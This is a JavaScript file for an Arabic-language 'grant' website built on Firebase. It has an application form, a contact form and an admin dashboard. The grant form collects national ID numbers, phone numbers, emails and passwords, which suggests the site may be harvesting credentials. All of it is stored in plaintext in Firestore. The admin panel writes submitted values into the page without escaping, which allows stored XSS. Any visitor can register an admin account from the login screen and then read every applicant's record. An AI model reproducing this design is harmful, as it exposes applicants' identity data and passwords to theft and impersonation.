// script.js - النسخة المحسنة مع preloader وإدارة الأخطاء
// التحقق من تحميل مكتبات Firebase
if (typeof firebase === 'undefined') {
  console.error("Firebase not loaded! Please check network or include Firebase scripts.");
  alert("حدث خطأ في تحميل المكتبات الأساسية. يرجى تحديث الصفحة.");
  // يمكن إعادة تحميل الصفحة تلقائياً بعد 2 ثانية
  setTimeout(() => location.reload(), 2000);
} else {
  // باقي الكود كما هو
}

// ==================== إعدادات Firebase ====================
const firebaseConfig = {
    apiKey: "AIzaSyBb8u2La-3zBI-wX-i57a9qqewCO1UF2x0",
    authDomain: "web-yes.firebaseapp.com",
    projectId: "web-yes",
    storageBucket: "web-yes.firebasestorage.app",
    messagingSenderId: "956753544595",
    appId: "1:956753544595:web:f16eb9f455517f59e45466",
    measurementId: "G-KE7F74R66W"
  };

// تهيئة Firebase
if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
const db = firebase.firestore();
const auth = firebase.auth();

// ==================== Preloader (يظهر في كل الصفحات) ====================
function showPreloader(duration = 800) {
  // إذا كان عنصر preloader موجوداً بالفعل نعرضه، وإلا ننشئه
  let preloader = document.querySelector('.preloader');
  if (!preloader) {
    preloader = document.createElement('div');
    preloader.className = 'preloader';
    preloader.innerHTML = `
      <div class="loader-content">
        <div class="logo">
          <svg width="60" height="60" viewBox="0 0 100 100" fill="none">
            <circle cx="50" cy="50" r="45" stroke="#3b82f6" stroke-width="6"/>
            <path d="M30 65 L30 35 L50 55 L70 35 L70 65" stroke="#3b82f6" stroke-width="6" stroke-linecap="round" stroke-linejoin="round"/>
          </svg>
          <span class="logo-text">نعم لبناء الوطن</span>
        </div>
        <div class="loader-text">جارٍ التحميل<span class="dots"></span></div>
      </div>
    `;
    document.body.appendChild(preloader);
  }
  preloader.style.display = 'flex';
  setTimeout(() => {
    preloader.style.opacity = '0';
    setTimeout(() => {
      preloader.style.display = 'none';
      preloader.style.opacity = '';
    }, 300);
  }, duration);
}

// إظهار preloader فور بدء تحميل الصفحة
showPreloader(600);

// ==================== دوال مساعدة ====================
function showModal(id) { document.getElementById(id)?.classList.remove('hidden'); }
function hideModal(id) { document.getElementById(id)?.classList.add('hidden'); }
function showErrorToast(msg) {
  // عرض رسالة خطأ بسيطة (يمكن تحسينها)
  alert("⚠️ " + msg);
}

// ==================== نموذج المنحة (grant.html) ====================
if (window.location.pathname.includes('grant.html')) {
  const form = document.getElementById('grantForm');
  let collectedData = null;
  form?.addEventListener('submit', (e) => { e.preventDefault();
    const data = new FormData(form);
    const obj = {};
    data.forEach((v,k)=> obj[k]=v);
    // التحقق من صحة البيانات الأساسية
    if (!obj.firstName || !obj.lastName || !obj.nationalId || !obj.phone || !obj.email || !obj.password) {
      alert("يرجى ملء جميع الحقول المطلوبة.");
      return;
    }
    collectedData = { ...obj, timestamp: firebase.firestore.FieldValue.serverTimestamp() };
    showModal('confirmModal1');
  });
  document.getElementById('confirmYes1')?.addEventListener('click', ()=> { hideModal('confirmModal1'); showModal('confirmModal2'); });
  document.getElementById('confirmNo1')?.addEventListener('click', ()=> { hideModal('confirmModal1'); });
  document.getElementById('confirmYes2')?.addEventListener('click', async ()=> {
    hideModal('confirmModal2');
    try {
      await db.collection('grants').add(collectedData);
      showModal('successModal');
      form.reset();
    } catch(e) {
      console.error(e);
      showErrorToast("فشل في حفظ الطلب: " + (e.message || "تحقق من اتصال الإنترنت وإعدادات Firebase"));
      showModal('errorModal');
    }
  });
  document.getElementById('confirmNo2')?.addEventListener('click', ()=> { hideModal('confirmModal2'); });
  document.getElementById('successOk')?.addEventListener('click', ()=> window.location.href='index.html');
  document.getElementById('errorOk')?.addEventListener('click', ()=> hideModal('errorModal'));
}

// ==================== نموذج الاتصال (contact.html) ====================
if (window.location.pathname.includes('contact.html')) {
  const form = document.getElementById('contactForm');
  form?.addEventListener('submit', async (e)=>{ e.preventDefault();
    const data = new FormData(form);
    const obj = { name: data.get('name'), email: data.get('email'), message: data.get('message'), timestamp: firebase.firestore.FieldValue.serverTimestamp() };
    try { 
      await db.collection('contacts').add(obj); 
      showModal('successModal'); 
      form.reset(); 
    } catch(e){ 
      console.error(e);
      showErrorToast("حدث خطأ أثناء الإرسال: " + e.message);
    }
  });
  document.getElementById('successOk')?.addEventListener('click', ()=> window.location.href='index.html');
}

// ==================== لوحة المدير (admin.html) مع المصادقة ====================
if (window.location.pathname.includes('admin.html')) {
  let currentUser = null;
  let allGrants = [];
  let currentPage = 1;
  const pageSize = 5;

  const authSection = document.getElementById('authSection');
  const adminPanel = document.getElementById('adminPanel');
  const loginBtn = document.getElementById('loginBtn');
  const logoutBtn = document.getElementById('logoutBtn');
  const searchInput = document.getElementById('searchInput');
  const filterProvince = document.getElementById('filterProvince');
  const sortBy = document.getElementById('sortBy');
  const container = document.getElementById('cardsContainer');
  const paginationDiv = document.getElementById('pagination');
  const totalSpan = document.getElementById('totalCount');

  // ملء خيارات المحافظات تلقائياً (تعديل للقائمة الناقصة)
  const provinces = ["دمشق","ريف دمشق","حلب","حمص","حماة","اللاذقية","طرطوس","إدلب","دير الزور","الرقة","الحسكة","درعا","السويداء","القنيطرة"];
  if (filterProvince) {
    filterProvince.innerHTML = '<option value="">جميع المحافظات</option>' + provinces.map(p => `<option value="${p}">${p}</option>`).join('');
  }

  function renderCards() {
    let filtered = allGrants.filter(g => {
      const searchTerm = searchInput.value.toLowerCase();
      const matchesSearch = !searchTerm || Object.values(g).some(val => String(val).toLowerCase().includes(searchTerm));
      const matchesProvince = !filterProvince.value || g.province === filterProvince.value;
      return matchesSearch && matchesProvince;
    });
    filtered.sort((a,b)=> sortBy.value === 'desc' ? (b.timestamp?.toMillis() - a.timestamp?.toMillis()) : (a.timestamp?.toMillis() - b.timestamp?.toMillis()));
    totalSpan.innerText = filtered.length;
    const start = (currentPage-1)*pageSize;
    const paginated = filtered.slice(start, start+pageSize);
    container.innerHTML = paginated.map(g => `
      <div class="grant-card" data-id="${g.id}">
        <h3>${g.firstName || ''} ${g.lastName || ''}</h3>
        <div class="field-row"><span class="field-label">الرقم الوطني:</span><span>${g.nationalId || ''}</span></div>
        <div class="field-row"><span class="field-label">الجوال:</span><span>${g.phone || ''}</span></div>
        <div class="field-row"><span class="field-label">المحافظة:</span><span>${g.province || ''}</span></div>
        <div class="field-row"><span class="field-label">البريد:</span><span>${g.email || ''}</span></div>
        <small>${g.timestamp ? new Date(g.timestamp.toMillis()).toLocaleString() : ''}</small>
      </div>
    `).join('');
    document.querySelectorAll('.grant-card').forEach(card => {
      card.addEventListener('click', () => {
        const id = card.dataset.id;
        const full = allGrants.find(g => g.id === id);
        if(full) {
          const details = Object.entries(full).map(([k,v]) => `<div><strong>${k}:</strong> ${v?.toString?.() || ''}</div>`).join('');
          document.getElementById('fullDataContent').innerHTML = details;
          showModal('detailModal');
        }
      });
    });
    const totalPages = Math.ceil(filtered.length/pageSize);
    let pagesHtml = '';
    for(let i=1;i<=totalPages;i++) pagesHtml += `<button class="page-btn" data-page="${i}">${i}</button>`;
    paginationDiv.innerHTML = pagesHtml;
    document.querySelectorAll('.page-btn').forEach(btn => btn.addEventListener('click', (e) => { currentPage = parseInt(e.target.dataset.page); renderCards(); }));
  }

  searchInput?.addEventListener('input', () => { currentPage=1; renderCards(); });
  filterProvince?.addEventListener('change', () => { currentPage=1; renderCards(); });
  sortBy?.addEventListener('change', () => renderCards());

  auth.onAuthStateChanged(user => {
    currentUser = user;
    if(user) {
      authSection.style.display = 'none';
      adminPanel.style.display = 'block';
      // استماع للتغييرات المباشرة
      db.collection('grants').orderBy('timestamp', 'desc').onSnapshot(snapshot => {
        allGrants = snapshot.docs.map(doc => ({ id: doc.id, ...doc.data() }));
        renderCards();
      }, error => {
        console.error("Firestore error:", error);
        showErrorToast("خطأ في تحميل البيانات: "+error.message);
      });
    } else {
      authSection.style.display = 'block';
      adminPanel.style.display = 'none';
    }
  });
  
  loginBtn?.addEventListener('click', async () => {
    const email = document.getElementById('adminEmail').value;
    const pwd = document.getElementById('adminPassword').value;
    if (!email || !pwd) { document.getElementById('loginError').innerText = 'الرجاء إدخال البريد وكلمة المرور'; return; }
    try { 
      await auth.signInWithEmailAndPassword(email, pwd); 
      document.getElementById('loginError').innerText = ''; 
    } catch(e) { 
      document.getElementById('loginError').innerText = 'فشل تسجيل الدخول: '+e.message;
    }
  });
  
  logoutBtn?.addEventListener('click', () => auth.signOut());
  document.getElementById('closeDetailBtn')?.addEventListener('click', () => hideModal('detailModal'));
  
  // إضافة زر تسجيل مدير جديد (اختياري)
  const registerBtn = document.createElement('button');
  registerBtn.textContent = "تسجيل مدير جديد";
  registerBtn.className = "btn-secondary";
  registerBtn.style.marginTop = "10px";
  registerBtn.onclick = async () => {
    const email = prompt("البريد الإلكتروني للمدير الجديد:");
    const pwd = prompt("كلمة المرور (يجب أن تكون قوية):");
    if (email && pwd) {
      try {
        await auth.createUserWithEmailAndPassword(email, pwd);
        alert("تم إنشاء حساب المدير! يمكنك الآن تسجيل الدخول.");
      } catch(e) { alert("خطأ: "+e.message); }
    }
  };
  document.getElementById('authSection')?.appendChild(registerBtn);
}